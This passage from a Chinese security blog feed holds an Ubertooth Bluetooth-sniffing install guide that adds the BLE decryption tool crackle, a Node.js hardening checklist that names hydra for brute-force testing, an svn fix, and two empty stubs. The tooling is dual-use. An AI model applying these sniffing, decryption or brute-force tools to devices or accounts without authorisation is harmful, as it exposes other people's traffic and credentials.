  <entry>
    <title>ubertooth安装</title>
    <link href="/2019/08/08/2019-08-07-ubertooth-install/"/>
    <url>/2019/08/08/2019-08-07-ubertooth-install/</url>
    
    <content type="html"><![CDATA[<h2 id="Ubertooth安装教程"><a href="#Ubertooth安装教程" class="headerlink" title="Ubertooth安装教程"></a>Ubertooth安装教程</h2><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本教程安装环境为ubuntu 19.04  ubertooth固件为2018-12-R1</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>在构建libbtbb和Ubertooth工具之前，需要预先安装一下编译环境，其中许多都可以从您的操作系统的安装源中中获得，例如：</p><h2 id="Debian-x2F-Ubuntu"><a href="#Debian-x2F-Ubuntu" class="headerlink" title="Debian&#x2F;Ubuntu"></a>Debian&#x2F;Ubuntu</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install cmake libusb-<span class="hljs-number">1.0</span>-<span class="hljs-number">0</span>-dev <span class="hljs-keyword">make</span> gcc g++ libbluetooth-dev pkg-config libpcap-dev <span class="hljs-keyword">python</span>-numpy <span class="hljs-keyword">python</span>-pyside <span class="hljs-keyword">python</span>-pyside2* <span class="hljs-keyword">python</span>-qt4<br></code></pre></td></tr></table></figure><h2 id="Fedora-x2F-Red-Hat"><a href="#Fedora-x2F-Red-Hat" class="headerlink" title="Fedora &#x2F; Red Hat"></a>Fedora &#x2F; Red Hat</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">su -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;yum install libusb1-devel make gcc wget tar bluez-libs-devel&quot;</span><br></code></pre></td></tr></table></figure><h2 id="MAC-OS"><a href="#MAC-OS" class="headerlink" title="MAC OS"></a>MAC OS</h2><p>Mac OS X用户可以使用MacPorts或Homebrew来安装所需的软件包</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>libusb wget cmake pkg-<span class="hljs-built_in">config</span> libpcap<br><span class="hljs-keyword">or</span><br><span class="hljs-keyword"></span>sudo port <span class="hljs-keyword">install </span>libusb wget cmake python27 py27-numpy py27-pyside<br></code></pre></td></tr></table></figure><h2 id="FreeBSD"><a href="#FreeBSD" class="headerlink" title="FreeBSD"></a>FreeBSD</h2><p>FreeBSD用户可以直接从ports和package系统安装主机工具和库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> pkg install ubertooth<br></code></pre></td></tr></table></figure><h1 id="安装libbtbb"><a href="#安装libbtbb" class="headerlink" title="安装libbtbb"></a>安装libbtbb</h1><p>接下来需要为Ubertooth工具构建蓝牙基带库(libbtbb)进而解析蓝牙数据包。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://github.com/greatscottgadgets/libbtbb/archive/<span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-R1.tar.gz -O libbtbb-<span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-R1.tar.gz<br><span class="hljs-attribute">tar</span> -xf libbtbb-<span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-R1.tar.gz<br><span class="hljs-attribute">cd</span> libbtbb-<span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-R1<br><span class="hljs-attribute">mkdir</span> build<br><span class="hljs-attribute">cd</span> build<br><span class="hljs-attribute">cmake</span> ..<br><span class="hljs-attribute">make</span><br><span class="hljs-attribute">sudo</span> make install<br></code></pre></td></tr></table></figure><p>注意：Linux用户如果是第一次安装或者出现无法找到libbtbb库的错误，请执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ldconfig<br></code></pre></td></tr></table></figure><h2 id="安装ubertooth工具"><a href="#安装ubertooth工具" class="headerlink" title="安装ubertooth工具"></a>安装ubertooth工具</h2><p>Ubertooth存储库包含用于嗅探蓝牙数据包，配置Ubertooth和更新固件的主机代码。默认情况下，使用以下三种方法构建和安装：</p><h2 id="实体编译"><a href="#实体编译" class="headerlink" title="实体编译"></a>实体编译</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://github.com/greatscottgadgets/ubertooth/releases/download/<span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-R1/ubertooth-<span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-R1.tar.xz<br><span class="hljs-attribute">tar</span> xf ubertooth-<span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-R1.tar.xz<br><span class="hljs-attribute">cd</span> ubertooth-<span class="hljs-number">2018</span>-<span class="hljs-number">12</span>-R1/host<br><span class="hljs-attribute">mkdir</span> build<br><span class="hljs-attribute">cd</span> build<br><span class="hljs-attribute">cmake</span> ..<br><span class="hljs-attribute">make</span><br><span class="hljs-attribute">sudo</span> make install<br></code></pre></td></tr></table></figure><p>注意：Linux用户如果是第一次安装或者出现找不到库的错误，请执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ldconfig<br></code></pre></td></tr></table></figure><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>Wireshark版本1.12及更新版本默认包含Ubertooth BLE插件。也可以通将Ubertooth的BLE直接捕获到Wireshark中。</p><p>Wireshark BTBB和BR&#x2F;EDR插件允许使用Kismet捕获的蓝牙基带流量在Wireshark GUI中进行分析和检测。它们与Ubertooth和libbtbb软件的其余部分分开构建。</p><p>传递给cmake的目录MAKE_INSTALL_LIBDIR因系统而异，但它应该是现有Wireshark插件的位置，例如asn1.so和ethercat.so。在macOS上目录可能位于&#x2F;Applications&#x2F;Wireshark.app&#x2F;Contents&#x2F;PlugIns&#x2F;wireshark&#x2F;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install wireshark wireshark-dev libwireshark-dev cmake<br><span class="hljs-built_in">cd</span> libbtbb-2018-12-R1/wireshark/plugins/btbb<br><span class="hljs-built_in">mkdir</span> build<br><span class="hljs-built_in">cd</span> build<br>cmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/x86_64-linux-gnu/wireshark/libwireshark3/plugins ..<br>make<br><span class="hljs-built_in">sudo</span> make install<br></code></pre></td></tr></table></figure><p>BT BR&#x2F;EDR组件重复相同的步骤进行安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install wireshark wireshark-dev libwireshark-dev cmake<br><span class="hljs-built_in">cd</span> libbtbb-2018-12-R1/wireshark/plugins/btbredr<br><span class="hljs-built_in">mkdir</span> build<br><span class="hljs-built_in">cd</span> build<br>cmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/x86_64-linux-gnu/wireshark/libwireshark3/plugins ..<br>make<br><span class="hljs-built_in">sudo</span> make install<br></code></pre></td></tr></table></figure><h2 id="第三方软件"><a href="#第三方软件" class="headerlink" title="第三方软件"></a>第三方软件</h2><p>有许多支持Ubertooth的第三方软件。有些人支持Ubertooth开箱即用，而其他人则需要建立插件。</p><h1 id="安装kismet"><a href="#安装kismet" class="headerlink" title="安装kismet"></a>安装kismet</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install kismet<br></code></pre></td></tr></table></figure><h1 id="安装BLE解密工具crackle"><a href="#安装BLE解密工具crackle" class="headerlink" title="安装BLE解密工具crackle"></a>安装BLE解密工具crackle</h1><p>crackle的地址是：<a href="https://github.com/mikeryan/crackle.git">https://github.com/mikeryan/crackle.git</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/mikeryan/crackle.git<br><span class="hljs-keyword">cd</span> crackle<br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><h1 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h1><h2 id="No-module-named-PySide2"><a href="#No-module-named-PySide2" class="headerlink" title="No module named PySide2"></a>No module named PySide2</h2><p>当运行<code>ubertooth-specan-ui </code>会显示</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fortran">$ ubertooth-specan-ui<br>Traceback (most recent <span class="hljs-keyword">call</span> last):<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;/usr/local/bin/ubertooth-specan-ui&quot;</span>, line <span class="hljs-number">29</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    from PySide2 <span class="hljs-keyword">import</span> QtCore, QtGui, QtWidgets<br>ImportError: No <span class="hljs-keyword">module</span> <span class="hljs-keyword">named</span> PySide2<br></code></pre></td></tr></table></figure><p>这个是由于pyside分为pyside和pyside2，官方提供安装列表中仅安装pyside，所以python-pyside2需要我们手动进行安装，<br>懒得去查看系统到底需要那些模块，这里大力出奇迹，安装apt源中所有的pyside2相关软件包。<br><img src="/img/ubertooth-specan-ui.png" alt="image"><br>大功告成。</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>文章主要是个人参考官方安装ubertooth常见的工具，为蓝牙测试做准备。</p><hr><p>参考：<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide">https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bluetooth</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安全开发流程</title>
    <link href="/2019/08/07/2019-08-07-security-develop/"/>
    <url>/2019/08/07/2019-08-07-security-develop/</url>
    
    <content type="html"><![CDATA[<h2 id="安全开发流程"><a href="#安全开发流程" class="headerlink" title="安全开发流程"></a>安全开发流程</h2><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="软件开发生命周期-SDL"><a href="#软件开发生命周期-SDL" class="headerlink" title="软件开发生命周期(SDL)"></a>软件开发生命周期(SDL)</h2><h1 id="安全需求"><a href="#安全需求" class="headerlink" title="安全需求"></a>安全需求</h1><h1 id="安全设计"><a href="#安全设计" class="headerlink" title="安全设计"></a>安全设计</h1><h1 id="安全编码"><a href="#安全编码" class="headerlink" title="安全编码"></a>安全编码</h1><h1 id="安全测试"><a href="#安全测试" class="headerlink" title="安全测试"></a>安全测试</h1><h1 id="安全部署和运维"><a href="#安全部署和运维" class="headerlink" title="安全部署和运维"></a>安全部署和运维</h1>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Develop</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SDL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos7 svn 客户端错误svn: E210007: Unable to connect to a repository at URL的解决方法</title>
    <link href="/2019/07/08/2019-07-08-centos-svn-client-error-E210007-unable-to-connect-to-a-repository-at-url/"/>
    <url>/2019/07/08/2019-07-08-centos-svn-client-error-E210007-unable-to-connect-to-a-repository-at-url/</url>
    
    <content type="html"><![CDATA[<h2 id="centos7-svn-客户端错误svn-E210007-Unable-to-connect-to-a-repository-at-URL的解决方法"><a href="#centos7-svn-客户端错误svn-E210007-Unable-to-connect-to-a-repository-at-URL的解决方法" class="headerlink" title="centos7 svn 客户端错误svn: E210007: Unable to connect to a repository at URL的解决方法"></a>centos7 svn 客户端错误svn: E210007: Unable to connect to a repository at URL的解决方法</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>centos7 使用svn同步代码，同步过程中报错</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">svn: E210007: Unable <span class="hljs-built_in">to</span> connect <span class="hljs-built_in">to</span> <span class="hljs-keyword">a</span> repository <span class="hljs-keyword">at</span> <span class="hljs-built_in">URL</span> <span class="hljs-string">&#x27;svn://git.oschina.net/cqcqphper/taskPHP&#x27;</span><br>svn: E210007: Cannot negotiate authentication mechanism<br></code></pre></td></tr></table></figure><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>服务器缺少cyrus-sasl cyrus-sasl-plain cyrus-sasl-ldap 组件。<br>运行以下命令，成功解决<br><code>sudo yum install cyrus-sasl cyrus-sasl-plain cyrus-sasl-ldap</code></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 反序列化问题</title>
    <link href="/2019/07/08/2019-07-08-fastjson/"/>
    <url>/2019/07/08/2019-07-08-fastjson/</url>
    
    <content type="html"><![CDATA[<h2 id="fastjson-反序列化问题"><a href="#fastjson-反序列化问题" class="headerlink" title="fastjson 反序列化问题"></a>fastjson 反序列化问题</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Node.js 安全清单</title>
    <link href="/2019/06/11/2019-06-11-Node-js-security-checklist/"/>
    <url>/2019/06/11/2019-06-11-Node-js-security-checklist/</url>
    
    <content type="html"><![CDATA[<h2 id="Node-js-安全清单"><a href="#Node-js-安全清单" class="headerlink" title="Node.js 安全清单"></a>Node.js 安全清单</h2><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>安全性，总是一个不可忽视的问题。许多人都承认这点，但是却很少有人真的认真地对待它。所以我们列出了这个清单，让你在将你的应用部署到生产环境来给千万用户使用之前，做一个安全检查。<br>以下列出的安全项，大多都具有普适性，适用于除了Node.js外的各种语言和框架。但是，其中也包含一些用Node.js写的小工具。</p><h1 id="配置管理"><a href="#配置管理" class="headerlink" title="配置管理"></a>配置管理</h1><h2 id="安全性相关的HTTP头"><a href="#安全性相关的HTTP头" class="headerlink" title="安全性相关的HTTP头"></a>安全性相关的HTTP头</h2><p>以下是一些安全性相关的HTTP头，你的站点应该设置它们：</p><ul><li>Strict-Transport-Security：强制使用安全连接（SSL&#x2F;TLS之上的HTTPS）来连接到服务器。</li><li>X-Frame-Options：提供对于“点击劫持”的保护。</li><li>X-XSS-Protection：开启大多现代浏览器内建的对于跨站脚本攻击（XSS）的过滤功能。</li><li>X-Content-Type-Options： 防止浏览器使用MIME-sniffing来确定响应的类型，转而使用明确的content-type来确定。</li><li>Content-Security-Policy：防止受到跨站脚本攻击以及其他跨站注入攻击。</li></ul><p>在Node.js中，这些都可以通过使用Helmet模块轻松设置完毕：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> helmet = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;helmet&#x27;</span>);<br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_ invoke__">express</span>();<br>app.<span class="hljs-keyword">use</span>(<span class="hljs-title function_ invoke__">helmet</span>());<br></code></pre></td></tr></table></figure><p>Helmet在Koa中也能使用：koa-helmet。<br>当然，在许多的架构中，这些头会在Web服务器(Apache，nginx)的配置中设置，而不是在应用的代码中。如果是通过nginx配置，配置文件会类似于如下例子：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># nginx.conf</span><br><br><span class="hljs-keyword">add_header </span>X-Frame-Options SAMEORIGIN;<br><span class="hljs-keyword">add_header </span>X-Content-Type-Options nosniff;<br><span class="hljs-keyword">add_header </span>X-XSS-Protection <span class="hljs-string">&quot;1; mode=block&quot;</span>;<br><span class="hljs-keyword">add_header </span>Content-Security-Policy <span class="hljs-string">&quot;default-src &#x27;self&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>完整的例子可以参考这个nginx配置。<br>如果你想快速确认你的网站是否都设置这些HTTP头，你可以通过这个网站在线检查：<a href="http://cyh.herokuapp.com/cyh">http://cyh.herokuapp.com/cyh</a> 。</p><h3 id="客户端的敏感数据"><a href="#客户端的敏感数据" class="headerlink" title="客户端的敏感数据"></a>客户端的敏感数据</h3><p>当部署前端应用时，确保不要在代码中暴露如密钥这样的敏感数据，这将可以被所有人看到。<br>现今并没有什么自动化检测它们的办法，但是还是有一些手段可以用来减少不小心将敏感数据暴露在客户端的概率：</p><ul><li>使用pull request更新代码</li><li>建立起code review机制</li></ul><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="对于暴力破解的保护"><a href="#对于暴力破解的保护" class="headerlink" title="对于暴力破解的保护"></a>对于暴力破解的保护</h3><p>暴力破解即系统地列举所有可能的结果，并逐一尝试，来找到正确答案。在web应用中，通常会出现在用户的登录模块。<br>你可以通过限制用户的连接频率来防止这类的攻击。在Node.js中，你可以使用ratelimiter模块。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">var</span> email = req.body.email;<br><span class="hljs-built_in">var</span> <span class="hljs-built_in">limit</span> = <span class="hljs-built_in">new</span> Limiter(&#123; id: email, db: db &#125;);<br><br><span class="hljs-built_in">limit</span>.<span class="hljs-built_in">get</span>(function(err, <span class="hljs-built_in">limit</span>) &#123;<br><br>&#125;);<br></code></pre></td></tr></table></figure><p>当然，你可以将它封装成一个中间件以供你的应用使用。Express和Koa都已经有现成不错的中间件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> ratelimit = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;koa-ratelimit&#x27;</span>);<br><span class="hljs-keyword">var</span> redis = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;redis&#x27;</span>);<br><span class="hljs-keyword">var</span> koa = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;koa&#x27;</span>);<br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_ invoke__">koa</span>();<br><br><span class="hljs-keyword">var</span> emailBasedRatelimit = <span class="hljs-title function_ invoke__">ratelimit</span>(&#123;<br>  <span class="hljs-attr">db</span>: redis.<span class="hljs-title function_ invoke__">createClient</span>(),<br>  <span class="hljs-attr">duration</span>: <span class="hljs-number">60000</span>,<br>  <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>  <span class="hljs-attr">id</span>: function (context) &#123;<br>    <span class="hljs-keyword">return</span> context.body.email;<br>    &#125;<br>&#125;);<br><br><span class="hljs-keyword">var</span> ipBasedRatelimit = <span class="hljs-title function_ invoke__">ratelimit</span>(&#123;<br>  <span class="hljs-attr">db</span>: redis.<span class="hljs-title function_ invoke__">createClient</span>(),<br>  <span class="hljs-attr">duration</span>: <span class="hljs-number">60000</span>,<br>  <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>  <span class="hljs-attr">id</span>: function (context) &#123;<br>    <span class="hljs-keyword">return</span> context.ip;<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, ipBasedRatelimit, emailBasedRatelimit, handleLogin);<br></code></pre></td></tr></table></figure><p>这里我们所做的，就是限制了在一段给定时间内，用户可以尝试登陆的次数，这可以减少用户密码被暴力破解的风险。以上例子中的选项都是可以根据实际情况进行改变的，所以不要简单的复制粘贴它们。<br>如果你想要测试你的服务在这些场景下的表现，你可以使用hydra（kali中暴力破解工具）。</p><h2 id="Session管理"><a href="#Session管理" class="headerlink" title="Session管理"></a>Session管理</h2><p>对于cookie的安全使用，其重要性是不言而喻的。特别是对于动态的web应用，在如HTTP这样的无状态协议的之上，它们需要使用cookie来维持状态。</p><h3 id="Cookie标志位"><a href="#Cookie标志位" class="headerlink" title="Cookie标志位"></a>Cookie标志位</h3><p>以下是每个cookie可以设置的属性的列表，以及它们的含义：</p><ul><li>secure - 这个属性告诉浏览器，仅在请求是通过HTTPS传输时，才传递cookie。</li><li>HttpOnly - 设置这个属性将禁止javascript脚本获取到这个cookie，这可以用来帮助防止跨站脚本攻击。</li></ul><h3 id="Cookie作用域"><a href="#Cookie作用域" class="headerlink" title="Cookie作用域"></a>Cookie作用域</h3><ul><li>domain - 这个属性用来比较请求URL中服务端的域名。如果域名匹配成功，或这是其子域名，则继续检查path属性。</li><li>path - 除了域名，cookie可用的URL路径也可以被指定。当域名和路径都匹配时，cookie才会随请求发送。</li><li>expires - 这个属性用来设置持久化的cookie，当设置了它之后，cookie在指定的时间到达之前都不会过期。</li></ul><p>在Node.js中，你可以使用cookies模块来轻松创建cookie。但是，它是较底层的。在创建应用时，你可能更想使用它的一些封装，如cookie-session 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> cookieSession = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;cookie-session&#x27;</span>);<br><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_ invoke__">express</span>();<br><br>app.<span class="hljs-keyword">use</span>(<span class="hljs-title function_ invoke__">cookieSession</span>(&#123;<br><span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;session&#x27;</span>,<br><span class="hljs-attr">keys</span>: [<br>process.env.COOKIE_KEY1,<br>process.env.COOKIE_KEY2<br>]<br>&#125;));<br><br>app.<span class="hljs-keyword">use</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br><span class="hljs-keyword">var</span> n = req.session.views || <span class="hljs-number">0</span>;<br>req.session.views = n++;<br>res.<span class="hljs-title function_ invoke__">end</span>(n + <span class="hljs-string">&#x27; views&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_ invoke__">listen</span>(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>(以上例子取自<a href="https://www.npmjs.com/package/cookie-session">cookie-session</a>模块的文档)</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨站请求伪造（CSRF）是一种迫使用户在他们已登录的web应用中，执行一个并非他们原意的操作的攻击手段。这种攻击常常用于那些会改变用户的状态的请求，通常它们并不窃取数据，因为攻击者并不能看到响应的内容。</br><br>在Node.js中，你可以使用<a href="https://www.npmjs.com/package/csrf">csrf模块</a>来缓和这种攻击。它同样是非常底层的，你可能更喜欢使用如<a href="https://www.npmjs.com/package/csurf">csurf</a>这样的Express中间件。<br>在路由层，可以会有如下代码：</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">var</span> cookieParser = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> csrf = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;csurf&#x27;</span>);<br><span class="hljs-keyword">var</span> bodyParser = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><br><span class="hljs-comment">// setup route middlewares</span><br><span class="hljs-keyword">var</span> csrfProtection = csrf(&#123; cookie: <span class="hljs-keyword">true</span> &#125;);<br><span class="hljs-keyword">var</span> parseForm = bodyParser.urlencoded(&#123; extended: <span class="hljs-keyword">false</span> &#125;);<br><br><span class="hljs-comment">// create express app</span><br><span class="hljs-keyword">var</span> app = express();<br><br><span class="hljs-comment">// we need this because &quot;cookie&quot; is true in csrfProtection</span><br>app.<span class="hljs-keyword">use</span>(cookieParser());<br><br>app.get(<span class="hljs-string">&#x27;/form&#x27;</span>, csrfProtection, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(req, res)</span> </span>&#123;<br><span class="hljs-comment">// pass the csrfToken to the view</span><br>res.render(<span class="hljs-string">&#x27;send&#x27;</span>, &#123; csrfToken: req.csrfToken() &#125;);<br>&#125;);<br><br>app.post(<span class="hljs-string">&#x27;/process&#x27;</span>, parseForm, csrfProtection, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(req, res)</span> </span>&#123;<br>res.send(<span class="hljs-string">&#x27;data is being processed&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>在视图层，你需要使用CSRF token：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/process&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;_csrf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">csrfToken</span>&#125;&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">Favorite color: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;favoriteColor&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span 